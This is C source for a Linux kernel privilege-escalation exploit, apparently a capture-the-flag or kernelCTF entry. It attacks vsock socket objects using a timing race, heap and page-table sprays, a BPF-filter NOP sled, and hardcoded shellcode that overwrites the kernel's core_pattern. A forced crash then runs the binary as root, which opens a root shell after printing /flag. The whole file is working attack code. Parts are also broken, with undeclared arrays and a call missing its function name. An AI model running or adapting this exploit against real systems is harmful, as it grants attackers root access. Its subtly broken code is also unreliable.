#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <linux/vm_sockets.h>
#include <pthread.h>
#include <linux/types.h>
#include <stdint.h>
#include <syscall.h>
#include <stdarg.h>
#include <sched.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/times.h>
#include <sys/timerfd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <linux/prctl.h>
#include <sys/prctl.h>
#include <poll.h>
#include <sys/epoll.h>
#include <stdatomic.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/resource.h>
#include <stddef.h>
#include <keyutils.h>


#include "modules/keyring.h"
#include "modules/xattr.h"
#include "modules/msg_msg.h"

int* shared_mutex;
struct sock_filter filter[0x1000];
char buf[0x1000];

#define SYSCHK(x)                     \
	({                                \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
			err(1, "SYSCHK(" #x ")"); \
		__res;                        \
	})

#define FAIL_IF(x) if ((x)) { \
        perror(#x); \
        return -1; \
}
#define SPRAY_ERROR 0
#define SPRAY_RETRY 1
#define SPRAY_SUCCESS 2

#define LAST_RESERVED_PORT 1023

#define NS_PER_JIFFIE 1000000ull

int cid_port_num = LAST_RESERVED_PORT;

void *trigger_stack = NULL;
void *heap_spray_stack = NULL;
volatile int status_spray = SPRAY_ERROR;


char buf[0x1000];
int tfd;

static void epoll_ctl_add(int epfd, int fd, uint32_t events)
{
	struct epoll_event ev;
	ev.events = events;
	ev.data.fd = fd;
	epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void do_epoll_enqueue(int fd)
{
	int cfd[2];
	int epoll_timefds[0x300];
	int epoll_fds[0x300];
	socketpair(AF_UNIX, SOCK_STREAM, 0, cfd);
	for (int k = 0; k < 0x10; k++)
	{
		if (fork() == 0)
		{
			for (int i = 0; i < 0x300; i++)
			{
				timefds[i] = dup(fd);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				epfds[i] = epoll_create(0x1);
			}
			for (int i = 0; i < 0x2c0; i++)
			{
				for (int j = 0; j < 0x300; j++)
				{
					// queue as many as possible async waiters at timerfd waitqueue
					epoll_ctl_add(epfds[i], timefds[j], 0);
				}
			}
			write(cfd[1], buf, 1);
			raise(SIGSTOP); // stop here for nothing and just keep epoll alive
		}
		// sync to make sure it has queue what we need
		read(cfd[0], buf, 1);
	}
	close(cfd[0]);
	close(cfd[1]);
}

struct virtio_vsock_sock {
	void *vsk;
	int tx_lock;
	int rx_lock;
	int tx_cnt;
	int peer_fwd_cnt;
	int peer_buf_alloc;
	int fwd_cnt;
	int last_fwd_cnt;
	int rx_bytes;
	int buf_alloc;
	char pad[4];
	char rx_queue[24];
	int msg_count;
};
_Static_assert(sizeof(struct virtio_vsock_sock) == 80, "virtio_vsock_sock size missmatch");

union key_payload {
        struct virtio_vsock_sock vvs;
        struct {
                char header[24];
                char data[];
        } key;
};

#define MAIN_CPU 0
#define HELPER_CPU 1

inline static int _pin_to_cpu(int id)
{
        cpu_set_t set;
        CPU_ZERO(&set);
        CPU_SET(id, &set);
        return sched_setaffinity(getpid(), sizeof(set), &set);
}

unsigned long long get_jiffies()
{
	return times(NULL) * 10;
}


int random_in_range(int min, int max)
{
	return rand() % (max - min + 1) + min;
}

int check_core()
{
    // Check if /proc/sys/kernel/core_pattern has been overwritten
    char buf[0x100] = {};
    int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    read(core, buf, sizeof(buf));
    close(core);
    return strncmp(buf, "|/proc/%P/fd/666 %P", strlen("|/proc/%P/fd/666 %P")) == 0;
}

int sc()
{
	int stopfd[2];
	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, stopfd));
	unsigned int prog_len = 0x900;
	/* In current environment, the max instructions in a program is near 0x900
	And we test 0x900 instructions * 0x50 forks * 0x100 sockets * 4 = 180 MB is enough large to spray and worked reliably
	*/
	struct sock_filter table[] = {
		{.code = BPF_LD + BPF_K, .k = 0xb3909090},
		{.code = BPF_RET + BPF_K, .k = SECCOMP_RET_ALLOW}};

	/* 0xb3909090 is NOPsled shellclode to make exploitation more reliable
90       nop
90       nop
90       nop
b3 b8    mov    bl, 0xb8
*/
	for (int i = 0; i < prog_len; i++)
		filter[i] = table[0];

	filter[prog_len - 1] = table[1];
	int idx = prog_len - 2;

	struct sock_fprog prog = {
		.len = prog_len,
		.filter = filter,
	};

	char buffer[0x1000];
	for (int k = 0; k < 0x50; k++)
	{
		if (fork() == 0) // use fork to bypass RLIMIT_NOFILE limit.
		{
			int fd[0x100][2];
			close(stopfd[1]);
			for (int i = 0; i < 0x100; i++)
			{
				SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, fd[i]));
				SYSCHK(setsockopt(fd[i][0], SOL_SOCKET,
								  SO_ATTACH_FILTER, &prog,
								  sizeof(prog)));
			}
			write(stopfd[0], buf, 1);
			while(*shared_mutex == 0)
				sleep(1);
			for (int i = 0; i < 0x100; i++)
			{
				// printf("run %d.%d!\n", k, i);
				if(check_core())
					exit(0);
				ssize_t bytes_written = write(fd[i][1], buffer, sizeof(buffer));
				ssize_t bytes_read = read(fd[i][0], buffer, sizeof(buffer));
			}
			read(stopfd[0], buf, 1);
			// exit(0);
		}
	}
	/* wait for all forks to finish spraying BPF code */
	read(stopfd[1], buf, 0x50);

	return 0;
}

int sockets[0x1000];

int sockets_child[0x1000];

#define CC_OVERFLOW_FACTOR 1
#define OBJS_PER_SLAB 0x2a
#define CPU_PARTIAL 0x10

#define DRAIN_SLABS_CNT ((CPU_PARTIAL + 1) * CC_OVERFLOW_FACTOR)

union key_payload payload = {};
union key_payload readout = {};
key_serial_t keys[256] = {};
const size_t payload_size = sizeof(payload.vvs) - sizeof(payload.key.header);

int user_key_payload_counter = 0;
int user_key_payloads[0x1000];
void generate_full_slabs_with_user_key_payload()
{
	struct sockaddr_vm connect_addr = {0};
	user_key_payload_counter = 0;
	connect_addr.svm_family = AF_VSOCK;
	connect_addr.svm_cid = VMADDR_CID_LOCAL;

	for(int t=0; t<DRAIN_SLABS_CNT; t++)
	{
		for(int i=1; i<OBJS_PER_SLAB; i++)
		{
			if(i % OBJS_PER_SLAB)
			{
				connect_addr.svm_port = ++cid_port_num;
				connect(sockets[i], (struct sockaddr *)&connect_addr, sizeof(connect_addr));
			}
			else
			{
				char desc[16] = {};
				snprintf(desc, sizeof(desc) - 1, "-%d", ++user_key_payload_counter);

				user_key_payloads[user_key_payload_counter] = 
					(KEYRING_TYPE_USER, desc, &payload, KEYRING_KMALLOC_96, KEY_SPEC_PROCESS_KEYRING);
			}
		}
	}

	for(int i=0; i<OBJS_PER_SLAB; i++)
	{
		char desc[16] = {};
		snprintf(desc, sizeof(desc) - 1, "-%d", ++user_key_payload_counter);
		((uint64_t *)&payload)[0] = user_key_payload_counter;
		user_key_payloads[user_key_payload_counter] = 
			create_keyring(KEYRING_TYPE_USER, desc, &payload, KEYRING_KMALLOC_96, KEY_SPEC_PROCESS_KEYRING);
	}
}

// spray object to slub, preparing cross cache
// vvs use kmalloc-96, so OBJS_PER_SLAB = 0x2a
int *generate_spray_vvs_fd(int cnt)
{
	int *socks = calloc(sizeof(int), cnt);
	for(int i=0; i<cnt; i++)
	{
		if((socks[i] = socket(AF_VSOCK, SOCK_SEQPACKET, 0)) < 0)
			perror("socket");

		unsigned long size = 0xeeff0011;
		setsockopt(socks[i], AF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE, &size, sizeof(size));
		size = 0;
		setsockopt(socks[i], AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &size, sizeof(size));

		struct timeval timeout = {
				.tv_sec = 0,
				.tv_usec = 1,
		};
		if(setsockopt(socks[i], AF_VSOCK, 8, &timeout, sizeof(struct timeval)) < 0)
			perror("setsockopt");
	}
	return socks;
}

void spray_vvs(int *socks, int cnt)
{
	struct sockaddr_vm connect_addr = {0};
	connect_addr.svm_family = AF_VSOCK;
	connect_addr.svm_cid = VMADDR_CID_LOCAL;

	for(int i=0; i<cnt; i++)
	{
		connect_addr.svm_port = ++cid_port_num;
		connect(socks[i], (struct sockaddr *)&connect_addr, sizeof(connect_addr));
	}
}

void release_all_socks()
{
	for(int t=0; t<DRAIN_SLABS_CNT; t++)
		for(int i=1; i<OBJS_PER_SLAB; i++)
			if(i % OBJS_PER_SLAB)
				close(sockets[i]);
	for(int i=0; i < OBJS_PER_SLAB; i++)
		close(sockets_child[i]);
}

void fill_victim_slab()
{
	struct sockaddr_vm connect_addr = {0};

	struct timespec tp;
	// clock_gettime(CLOCK_BOOTTIME , &tp);
	// printf("[%lld.%lld] fill_victim_slab start\n", tp.tv_sec, tp.tv_nsec);
	connect_addr.svm_family = AF_VSOCK;
	connect_addr.svm_cid = VMADDR_CID_LOCAL;
	for(int i=0; i<OBJS_PER_SLAB + 1; i++)
	{
		char desc[16] = {};
		snprintf(desc, sizeof(desc) - 1, "-%d", ++user_key_payload_counter);

		user_key_payloads[user_key_payload_counter] = 
			create_keyring(KEYRING_TYPE_USER, desc, &payload, KEYRING_KMALLOC_96, KEY_SPEC_PROCESS_KEYRING);
	}
	clock_gettime(CLOCK_BOOTTIME , &tp);
	printf("[%lld.%lld] fill_victim_slab end\n", tp.tv_sec, tp.tv_nsec);
}

void free_victim_slab()
{
	struct timespec tp;
	// clock_gettime(CLOCK_BOOTTIME , &tp);
	// printf("[%lld.%lld] free_victim_slab start\n", tp.tv_sec, tp.tv_nsec);
	for(int i=user_key_payload_counter; i>user_key_payload_counter - (OBJS_PER_SLAB*2 + 1); i--)
		remove_keyring(user_key_payloads[i]);
	user_key_payload_counter -= OBJS_PER_SLAB*2 + 1;
	clock_gettime(CLOCK_BOOTTIME , &tp);
	printf("[%lld.%lld] free_victim_slab end\n", tp.tv_sec, tp.tv_nsec);
}

#define SEQ_FILE_CNT 0x300
int seqfd[SEQ_FILE_CNT];

void spray_seq_operations()
{
	struct timespec tp;
	// clock_gettime(CLOCK_BOOTTIME , &tp);
	// printf("[%lld.%lld] spray_seq_operations start\n", tp.tv_sec, tp.tv_nsec);
	for (int i = 0; i < SEQ_FILE_CNT; i++) 
		seqfd[i] = open("/proc/self/stat", O_RDONLY);
	clock_gettime(CLOCK_BOOTTIME , &tp);
	printf("[%lld.%lld] spray_seq_operations end\n", tp.tv_sec, tp.tv_nsec);
}

void cleanup_seqs()
{
	for (int i = 0; i < SEQ_FILE_CNT; i++) 
		close(seqfd[i]);
}


#define FILENAME_LEN 0x100
#define FILENAME_PREFIX "/tmp/a"
#define XATTR_PADDING_STR "A"
void spray_xattrs(int uniquenum, int cnt)
{
	char file_name[FILENAME_LEN];
	char value_name[XATTR_VALUE_KMALLOC_CG_8K];
    char attribute_name[XATTR_VALUE_KMALLOC_CG_8K];
	struct timespec tp;

	// clock_gettime(CLOCK_BOOTTIME , &tp);
	// printf("[%lld.%lld] spray_xattrs start\n", tp.tv_sec, tp.tv_nsec);

	snprintf(file_name, FILENAME_LEN, "%s-%08d", FILENAME_PREFIX, uniquenum);
	close(creat(file_name, 0644));

	for (uint64_t i = 0; i < cnt; i++) {
		snprintf(value_name, XATTR_VALUE_KMALLOC_CG_8K, "security.value%05lu-%s", i, XATTR_PADDING_STR);
		snprintf(attribute_name, XATTR_VALUE_KMALLOC_CG_8K, "security.attr%12lu-%s", 3, XATTR_PADDING_STR);
		create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_KMALLOC_CG_96, true);
    }

	clock_gettime(CLOCK_BOOTTIME , &tp);
	printf("[%lld.%lld] spray_xattrs end\n", tp.tv_sec, tp.tv_nsec);
}

int kill_count = 1;
static inline size_t rdtsc_begin(void)
{
#if defined(ARM64)
  return rdtsc();
#else
  size_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("lfence");
  return a;
#endif
}

static inline size_t rdtsc_end(void)
{
#if defined(ARM64)
  return rdtsc();
#else
  size_t a, d;
  asm volatile ("lfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
#endif
}

// uint64_t PHYS_LO_32 = 0x2200000;
uint64_t PHYS_LO_32 = 0x1f00000;

#define N_PAGESPRAY 0x500
#define MMAP_SIZE 0x400000
void *page_spray[N_PAGESPRAY];

// int random_in_range(int min, int max, unsigned int *seed)
// {
// 	return rand_r(seed) % (max - min + 1) + min;
// }

unsigned int generate_seed() {
	struct timespec ts;
	clock_gettime(CLOCK_REALTIME, &ts);
	return (unsigned int)(ts.tv_nsec);
}

int *race_shared_mutex;

int race_thread(void *arg)
{
	_pin_to_cpu(HELPER_CPU);
	for(int i=0; i < N_PAGESPRAY; i++)
		for(int j=MMAP_SIZE/0x2000; j<MMAP_SIZE/0x1000; j += 0x60/8)
			*(uint64_t *)(page_spray[i] + 0x3000 + 0x1000*j) = 0x4141414141414141;
}

char stack[0x100000];
int race_trigger(void *arg)
{
	struct sockaddr_vm connect_addr = {0};
	struct sockaddr_vm listen_addr = {0};
	pid_t conn_pid, listen_pid;
	unsigned int parent_seed = generate_seed();
	unsigned int child_seed = generate_seed();

	int socket_a = socket(AF_VSOCK, SOCK_SEQPACKET, 0);
	int socket_b = socket(AF_VSOCK, SOCK_SEQPACKET, 0);

	cid_port_num++;

	connect_addr.svm_family = AF_VSOCK;
	connect_addr.svm_cid = VMADDR_CID_LOCAL;
	connect_addr.svm_port = cid_port_num;

	listen_addr.svm_family = AF_VSOCK;
	listen_addr.svm_cid = VMADDR_CID_LOCAL;
	listen_addr.svm_port = cid_port_num;
	bind(socket_a, (struct sockaddr *)&listen_addr, sizeof(listen_addr));

	listen(socket_a, 0);

	unsigned long size = (PHYS_LO_32 | (0x067)) & (0xffffffff);
	setsockopt(socket_a, AF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE, &size, sizeof(size));
	size = 0x1234;
	setsockopt(socket_a, AF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE, &size, sizeof(size));

	_pin_to_cpu(HELPER_CPU);
	generate_full_slabs_with_user_key_payload();
	for (int i = 0; i < N_PAGESPRAY; i++) {
		page_spray[i] = mmap((void*)(0xdead0000000UL + i*MMAP_SIZE),
							MMAP_SIZE, PROT_READ|PROT_WRITE,
							MAP_ANONYMOUS|MAP_SHARED, -1, 0);
		if (page_spray[i] == MAP_FAILED) panic("mmap");
	}

	int tfd1 = timerfd_create(CLOCK_MONOTONIC, 0);
	int tfd2 = timerfd_create(CLOCK_MONOTONIC, 0);
	int tfd3 = timerfd_create(CLOCK_MONOTONIC, 0);
	int tfd4 = timerfd_create(CLOCK_MONOTONIC, 0);
	unsigned long tmp;

	int communicate_pipe[2];
	char comm_buf[4];
	pipe(communicate_pipe);
	int v = random_in_range(1, 10);
	conn_pid = fork();

	if (conn_pid == 0) {
		int vv = 0xffff;
		char desc[16] = {};
		snprintf(desc, sizeof(desc) - 1, "-%d", ++vv);
		add_key(KEYRING_TYPE_USER, desc, &payload, KEYRING_KMALLOC_96, KEY_SPEC_PROCESS_KEYRING);
		
		int *fds[0x28];
		for(int i=0; i<0x28; i++) 
			fds[i] = generate_spray_vvs_fd(OBJS_PER_SLAB);
		int *checkfd = generate_spray_vvs_fd(OBJS_PER_SLAB);
		int *remainfd = generate_spray_vvs_fd(OBJS_PER_SLAB);
		for(int i=0; i<0x20; i++) 
			spray_vvs(fds[i], OBJS_PER_SLAB);

		uint64_t times[OBJS_PER_SLAB];
		uint64_t t0, t1;
		snprintf(desc, sizeof(desc) - 1, "-%d", ++vv);
		key_serial_t keyv;
		for(int i=0; i<OBJS_PER_SLAB; i++)
		{
			spray_vvs(&checkfd[i], 1);
			sched_yield();
			t0 = rdtsc_begin();
			keyv = create_keyring(KEYRING_TYPE_USER, desc, &payload, KEYRING_KMALLOC_96, KEY_SPEC_PROCESS_KEYRING);
			t1 = rdtsc_end();
			times[i] = t1-t0;
		}

		int inuse = -1, currv = 0;
		for(int i=OBJS_PER_SLAB-1; i>=0; i--)
			if(times[i] > 5500)
			{
				inuse = OBJS_PER_SLAB - i;
				break;
			}
		
		// wait for the forked process to finish
		printf("inuse: %d\n", inuse);
		usleep(10000);

		for(int i=inuse; i<OBJS_PER_SLAB-1; i++)
			spray_vvs(&remainfd[i], 1);
		
		remove_keyring(keyv);
		// spray_vvs(&remainfd[OBJS_PER_SLAB-1], 1);

		write(communicate_pipe[1], "123", 3);
		struct itimerspec it = {};

		it.it_value.tv_sec = 0;
		it.it_value.tv_nsec = v * (NS_PER_JIFFIE/100);
		FAIL_IF(timerfd_settime(tfd1, 0, &it, NULL) < 0);

		read(tfd1, &tmp, sizeof(tmp));

		connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));

		exit(0);
	} else {
		read(communicate_pipe[0], comm_buf, 3);
		struct itimerspec it = {};

		it.it_value.tv_sec = 0;
		it.it_value.tv_nsec = v * (NS_PER_JIFFIE/100);
		FAIL_IF(timerfd_settime(tfd2, 0, &it, NULL) < 0);

		read(tfd2, &tmp, sizeof(tmp));

		kill(conn_pid, SIGKILL);
		wait(NULL);
	}

	// sleep(1);

	listen_pid = clone(race_thread, stack + 0x100000, CLONE_VM | SIGCHLD, NULL);

	_pin_to_cpu(MAIN_CPU);
	unsigned long long begin = get_jiffies();
	struct itimerspec new = {.it_value.tv_nsec = 1500000};
	timerfd_settime(tfd, TFD_TIMER_CANCEL_ON_SET, &new, NULL);
	
	connect_addr.svm_cid = 0;
	connect(socket_b, (struct sockaddr *)&connect_addr, sizeof(connect_addr));
	write(communicate_pipe[1], "123", 3);
	do {
		listen(socket_b, 0);
	} while (get_jiffies() - begin < 25);

	printf("pte spray fin\n");
	
	wait(listen_pid);
	return 0;
}

char shellcode[0x1000];
int heap_spraying(void *arg)
{
	union key_payload payload = {};
	union key_payload readout = {};
	key_serial_t keys[256] = {};

	status_spray = SPRAY_ERROR;
	*race_shared_mutex = 0;

	int race_trigger_pid = clone(race_trigger, trigger_stack, CLONE_VM | SIGCHLD, NULL);
	FAIL_IF(race_trigger_pid < 0);

	const size_t payload_size = sizeof(payload.vvs) - sizeof(payload.key.header);
	memset(&payload, '?', sizeof(payload));

	_pin_to_cpu(MAIN_CPU);

	unsigned long long begin = get_jiffies();
	do {

	} while (get_jiffies() - begin < 25);
	wait(race_trigger_pid);

	cleanup_seqs();
	release_all_socks();

	printf("try to access\n");
	int success = 0;
	for(int i=0; i < N_PAGESPRAY; i++)
		for(int j=MMAP_SIZE/0x2000; j<MMAP_SIZE/0x1000; j += 0x60/8)
		{
			uint64_t v = *(uint64_t *)(page_spray[i] + 0x3000 + 0x1000*j + 0x100);
			if(v && v != 0xb390909000000000)
			{
				status_spray = SPRAY_SUCCESS;
				printf("val: 0x%llx\n", v);
				memcpy(page_spray[i] + 0x3000 + 0x1000*j + 0x100, shellcode, 0x500);
				return 0;
			}
			else if(v == 0xb390909000000000)
			{
				printf("fail val: 0x%llx\n", v);
				PHYS_LO_32 += 0x100000;
			}
		}
	printf("access fin\n");			

	for (int i = 0; i < N_PAGESPRAY; i++)
		munmap(page_spray[i], MMAP_SIZE);

	// *race_shared_mutex = 1;
	// while(*race_shared_mutex == 1)
	// 	usleep(1000);
	status_spray = SPRAY_RETRY;

	// printf("heap_spraying end\n");
	return 0;
}

// mov rcx, 0xc0000082
// rdmsr 

// shl rdx, 32
// or rdx, rax
// sub rdx, 0x1400080 ; entry_SYSCALL_64
// mov r12, rdx

// mov rdi, r12
// add rdi, 0x29bace0 ; core_pattern

// mov rsi, 0x12340000 ; src userland buffer

// mov rdx, 0x20 ; len

// mov rax, r12
// add rax, 0x8e0990 ; copy_from_user
// call rax

// mov rax, 0x7fff0000
// pop r13
// pop rbx
// leave
// ret

char overwrite_core_pattern_shellcode[0x100] = "\x48\xB9\x82\x00\x00\xC0\x00\x00\x00\x00\x0F\x32\x48\xC1\xE2\x20\x48\x09\xC2\x48\x81\xEA\x80\x00\x40\x01\x49\x89\xD4\x4C\x89\xE7\x48\x81\xC7\xE0\xAC\x9B\x02\x48\xC7\xC6\x00\x00\x34\x12\x48\xC7\xC2\x20\x00\x00\x00\x4C\x89\xE0\x48\x05\x90\x09\x8E\x00\xFF\xD0\x48\xC7\xC0\x00\x00\xFF\x7F\x41\x5D\x5B\xC9\xC3";

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

void root(char *buf)
{
	int pid = strtoull(buf, 0, 10);
	char path[0x100];
	printf("run root()\n");
	// fix stdin, stdout, stderr
	sprintf(path, "/proc/%d/ns/net", pid);
	int pfd = syscall(SYS_pidfd_open, pid, 0);
	int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
	int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
	int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
	dup2(stdinfd, 0);
	dup2(stdoutfd, 1);
	dup2(stderrfd, 2);
	// just cat the flag
	system("cat /flag;bash");
}

int main(int argc, void *argv[])
{	
	// if flag doesn't printed until 2 minutes, stop process (for pass an action)
	alarm(120);

	if (argc > 1)
	{
		printf("triggered from core_pattern\n");
		root(argv[1]);
		exit(0);
	}

	// PHYS_LO_32 = strtoll(argv[1], NULL, 0);
	struct rlimit rlim = {
		.rlim_cur = 4096,
		.rlim_max = 4096};
	setrlimit(RLIMIT_NOFILE, &rlim);
	
	char *targetstr = (char *)mmap(0x12340000, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	strcpy(targetstr, "|/proc/%P/fd/666 %P");

	memset(shellcode, 0x90, 0x100);
	memcpy(shellcode + 0x100, overwrite_core_pattern_shellcode, 0x100);
	
	shared_mutex = mmap(NULL, sizeof(int), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	*shared_mutex = 0;
	race_shared_mutex = mmap(NULL, sizeof(int), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
	sc();

	tfd = timerfd_create(CLOCK_MONOTONIC, 0);
	do_epoll_enqueue(tfd);
	srand(time(NULL));
	memset(&payload, '?', sizeof(payload));

	trigger_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	FAIL_IF(trigger_stack == MAP_FAILED);
	trigger_stack += 0x8000;
	heap_spray_stack = mmap(NULL, 0x8000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	FAIL_IF(heap_spray_stack == MAP_FAILED);
	heap_spray_stack += 0x8000;

	do {
		int spray_worker_pid = clone(heap_spraying, heap_spray_stack, CLONE_NEWUSER | CLONE_NEWNET | CLONE_VM | SIGCHLD, NULL);
		FAIL_IF(spray_worker_pid < 0);
		FAIL_IF(waitpid(spray_worker_pid, NULL, 0) < 0);
	} while (status_spray == SPRAY_RETRY);

	*shared_mutex = 1;

	// loop until core_pattern is changed
	while(true)
	{
		if(check_core())
		{
			printf("core pattern changed!\n");
			char buf[0x100] = {};
    		int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
    		read(core, buf, sizeof(buf));
			write(1, buf, sizeof(buf));
			if(!fork())
			{
				int memfd = memfd_create("x", 0);
				SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0,
								0xffffffff));
				dup2(memfd, 666);
				close(memfd);
				// trigger crash
				*(size_t *)0 = 0;
			}
			break;
		}
		sleep(1);
	}

	// because of dirty pagetable, we must preserve pages
	while(true)
		sleep(100);

	return 0;
}